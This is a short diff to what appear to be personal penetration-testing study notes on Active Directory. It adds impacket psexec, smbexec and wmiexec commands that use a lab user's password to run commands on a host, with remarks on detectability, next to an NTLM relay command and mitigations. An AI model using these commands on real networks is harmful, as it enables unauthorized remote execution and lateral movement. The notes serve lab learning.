@@ -40,6 +40,17 @@ impacket-ntlmrelayx -tf targets.txt -smb2support --no-multirelay -i
 
 #Mitigation: smb signing enable, ntlm disable, 
 # **account tiering, local admin restriction
+
+# Chain credentials to command execution
+
+impacket-psexec marvel.local/fcastle:Password1@192.168.0.5 # noisy
+
+impacket-smbexec marvel.local/fcastle:Password1@192.168.0.5
+
+impacket-wmiexec marvel.local/fcastle:Password1@192.168.0.5
+
+# all of these bring file downloads which can be detected
+
  
 # How does file sharing work and how far does it go in file system?
 
